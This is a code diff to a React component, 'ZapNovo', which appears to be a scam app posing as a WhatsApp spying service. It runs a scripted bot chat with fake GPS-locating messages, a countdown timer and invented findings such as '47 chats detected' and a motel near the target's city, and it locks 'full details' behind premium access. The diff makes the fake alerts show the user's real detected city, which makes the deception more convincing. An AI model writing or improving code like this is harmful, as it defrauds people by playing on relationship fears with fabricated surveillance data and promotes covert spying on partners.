@@ -25,7 +25,7 @@ export default function ZapNovo() {
   const [currentStep, setCurrentStep] = useState(0);
   const [userPhone, setUserPhone] = useState("");
   const [userGender, setUserGender] = useState("");
-  const [userLocation, setUserLocation] = useState({ city: "Campinas", state: "SP" });
+  const [userLocation, setUserLocation] = useState({ city: "São Paulo", state: "SP" });
   const [notifications, setNotifications] = useState<Notification[]>([]);
   const [timeLeft, setTimeLeft] = useState(600); // 10 minutos em segundos
   const [showTimer, setShowTimer] = useState(false);
@@ -287,11 +287,16 @@ export default function ZapNovo() {
       addBotMessage("🌐 Ativando GPS e localizando dispositivo...", 9500);
     }, 9500);
 
-    // Detectar localização real
+    // Detectar localização real ANTES de continuar
+    let detectedCity = "São Paulo";
+    let detectedState = "SP";
+    
     try {
       const location = await detectUserLocation(phone);
-      setUserLocation({ city: location.city, state: location.state });
-      console.log("📍 Localização detectada:", location.city, location.state);
+      detectedCity = location.city;
+      detectedState = location.state;
+      setUserLocation({ city: detectedCity, state: detectedState });
+      console.log("📍 Localização detectada:", detectedCity, detectedState);
     } catch (error) {
       console.error("Erro ao detectar localização:", error);
     }
@@ -309,11 +314,9 @@ export default function ZapNovo() {
     }, 18500);
 
     setTimeout(() => {
-      const city = userLocation.city;
-      const state = userLocation.state;
       addBotMessage(
         `🎯 **ANÁLISE PRELIMINAR CONCLUÍDA**\n\n` +
-        `📍 Localização Atual: ${city}, ${state}\n` +
+        `📍 Localização Atual: ${detectedCity}, ${detectedState}\n` +
         `📱 Status do Dispositivo: Online agora\n` +
         `💬 Conversas Ativas: 47 chats detectados\n` +
         `🔥 Conversas Suspeitas: 12 com a mesma pessoa\n` +
@@ -325,10 +328,9 @@ export default function ZapNovo() {
     }, 21500);
 
     setTimeout(() => {
-      const city = userLocation.city;
       addBotMessage(
         `🚨 **ALERTA DE LOCALIZAÇÃO SUSPEITA!**\n\n` +
-        `🏨 Motel detectado na região de ${city}\n` +
+        `🏨 Motel detectado na região de ${detectedCity}\n` +
         `📍 Endereço completo disponível no acesso completo\n` +
         `⏰ Última visita: Informação disponível no acesso completo\n` +
         `📊 Frequência: Dados completos no acesso premium\n` +
